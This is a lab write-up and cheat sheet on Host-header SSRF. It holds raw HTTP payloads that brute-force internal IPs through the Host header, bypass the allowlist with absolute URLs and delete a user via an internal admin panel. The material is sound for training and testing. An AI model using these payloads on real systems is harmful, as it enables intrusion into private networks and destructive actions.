# HTTP Host header attacks - SSRF and routing-based attacks

Reverse proxies and load balancers forward the `Host` header to the back-end to determine where to route the request. If the routing infrastructure uses the Host header as the upstream address, an attacker can substitute an internal IP to reach services that are not directly accessible from the internet. In the "flawed request parsing" variant, the server validates the Host header but accepts an absolute URL in the request line - the middleware routes based on the absolute URL's host while the back-end still reads the `Host` header for internal routing decisions.

## Quick reference

```
# Routing-based SSRF (Host header forwarded as upstream address)
GET / HTTP/1.1
Host: 192.168.0.§1§   <- Intruder 0-255, look for 302 to /admin
-> GET /admin with that IP -> admin panel
-> GET /admin/delete?csrf=X&username=carlos  (change method to POST if needed)

# Absolute URL SSRF (flawed request parsing)
GET https://LAB-ID.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.§1§
-> outer validation uses absolute URL (allowed), inner routing uses Host -> SSRF
-> GET https://LAB-ID.web-security-academy.net/admin  Host: 192.168.0.X  -> /admin
```

## Root cause

**Routing-based SSRF:** The load balancer/reverse proxy forwards the `Host` header as-is to the upstream target. When an attacker sets `Host: 192.168.0.1`, the middleware issues an internal HTTP request to that IP, making the victim server act as a proxy into the private network.

**Flawed request parsing:** The application's WAF or first-hop server validates the `Host` header against an allowlist. However, when an absolute URL appears in the request line (valid per HTTP/1.1), the middleware parses the host from the absolute URL for validation/routing but the back-end application still reads the `Host` header. Changing `Host` to an internal IP now bypasses the allowlist check while directing the internal request.

## Find it

1. Send any request with `Host: BURP-COLLABORATOR-DOMAIN` -> check Collaborator for HTTP interaction. Confirmed = routing SSRF.
2. If Host validation blocks it: try adding an absolute URL to the request line:
   `GET https://LAB-ID.web-security-academy.net/` with modified Host -> does app still respond?
3. If yes with absolute URL -> flawed request parsing SSRF.
4. Confirm SSRF by adding Collaborator payload in Host with absolute URL in request line -> check Collaborator.

## Technique

**Routing-based SSRF:**
1. Send GET / to Burp Repeater. Change `Host` to Collaborator domain -> Collaborator receives HTTP request -> SSRF confirmed.
2. Send GET / to Intruder. Deselect "Update Host header to match target".
3. Set Host: `192.168.0.§0§`. Payload type: Numbers, 0-255, step 1.
4. Run attack. Sort by Status: look for 302 (redirect to /admin) -> note the IP.
5. In Repeater with that IP in Host: GET /admin -> admin panel HTML response.
6. Study the delete form: finds POST to /admin/delete with CSRF token + username parameter.
7. Extract CSRF token from the response. Copy the session cookie from Set-Cookie.
8. Change path to /admin/delete?csrf=<TOKEN>&username=carlos, add session cookie, change to POST -> send -> solved.

**Flawed request parsing SSRF:**
1. GET / -> normal. Try changing Host to `example.com` -> blocked (400/403).
2. Try: `GET https://LAB-ID.web-security-academy.net/ HTTP/1.1` with `Host: example.com` -> works (200).
3. Confirm SSRF: Host: COLLABORATOR-DOMAIN with absolute URL -> Collaborator receives interaction.
4. Intruder: absolute URL in request line, Host: 192.168.0.§0§, 0-255 -> find internal admin IP.
5. `GET https://LAB-ID.web-security-academy.net/admin  Host: 192.168.0.X` -> admin panel.
6. Extract CSRF, change to `/admin/delete?csrf=X&username=carlos`, POST -> solved.

## Payload arsenal

```http
# Routing-based SSRF - probe internal network
GET / HTTP/1.1
Host: 192.168.0.1

# Routing-based SSRF - reach admin
GET /admin HTTP/1.1
Host: 192.168.0.X   <- IP that returned 302

# Routing-based SSRF - delete user
POST /admin/delete HTTP/1.1
Host: 192.168.0.X
Cookie: _lab=LAB-COOKIE; session=SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

csrf=CSRF-TOKEN&username=carlos

# Flawed request parsing - probe
GET https://LAB-ID.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.§1§

# Flawed request parsing - admin access
GET https://LAB-ID.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.X

# Flawed request parsing - delete user
POST https://LAB-ID.web-security-academy.net/admin/delete?csrf=TOKEN&username=carlos HTTP/1.1
Host: 192.168.0.X
Cookie: _lab=LAB-COOKIE; session=SESSION-COOKIE
```

## Bypasses

| Defense | Bypass |
|---|---|
| Host validated against allowlist | Use absolute URL in request line -> host from absolute URL validated, Host header used for routing |
| Response is 400 for modified Host | Confirm absolute URL bypass first; also try X-Forwarded-Host, X-Forwarded-For |
| Admin form requires POST with CSRF | Extract CSRF from GET /admin response -> include in POST; copy session cookie from Set-Cookie |
| Intruder warning about host mismatch | Deselect "Update Host header to match target" in Intruder settings |

## Exploitation walkthrough

**Routing-based:** Collaborator confirms SSRF -> Intruder Host: 192.168.0.0/24 -> 302 at X.X.X.Y -> GET /admin with Host=Y -> admin panel -> extract CSRF + session cookie -> POST /admin/delete?csrf=&username=carlos -> solved.

**Flawed request parsing:** Normal Host blocked -> absolute URL + modified Host allowed -> Collaborator confirms SSRF -> Intruder on Host with absolute URL in request line -> find admin IP -> access /admin -> extract CSRF -> POST to delete carlos.

## Chaining

- Internal admin panel -> delete users -> [Access-control](../../Access-control/)
- Internal services found -> further SSRF -> [SSRF](../../SSRF/) chain into cloud metadata
- Admin panel CSRF token can be combined with Host header + [CSRF](../../CSRF/) for escalated attacks

## Tools

- **Burp Collaborator** - confirm out-of-band SSRF from Host header
- **Burp Intruder** - brute 192.168.0.0-255 via Host (Numbers payload 0-255)
- **Burp Repeater** - manual admin panel interaction, CSRF extraction, delete request

## Labs

### Routing-based SSRF [Practitioner]
Collaborator confirms Host-based SSRF. Intruder Host: 192.168.0.§0§ -> 302 at target IP -> GET /admin -> admin panel. Extract CSRF + session cookie -> POST /admin/delete?csrf=X&username=carlos. Key insight: routing infrastructure uses Host as upstream address; arbitrary internal IPs reachable.

### SSRF via flawed request parsing [Practitioner]
Normal Host modification blocked. Absolute URL in request line bypasses Host validation. Confirm SSRF via Collaborator with absolute URL + modified Host. Intruder same as above but with absolute URL. Navigate to admin panel -> extract CSRF -> delete carlos. Key insight: middleware validates from absolute URL but routes based on Host header - two different parsing paths.

## Real-world notes

- Routing-based SSRF is especially impactful in cloud/microservice environments where internal services listen on 169.254.x.x, 10.x.x.x, or 172.16.x.x.
- The absolute URL bypass is an HTTP/1.1 specification quirk: request-line host takes priority over Host header for routing per RFC 7230 - implementations vary.
- Always try `Host: localhost`, `Host: 127.0.0.1`, `Host: 0.0.0.0` before brute-forcing - admin panels often only trust loopback.
- After finding the admin IP, copy the session cookie from the redirect response's `Set-Cookie` - you need it for the admin actions.

## References

- https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf
- https://portswigger.net/web-security/ssrf
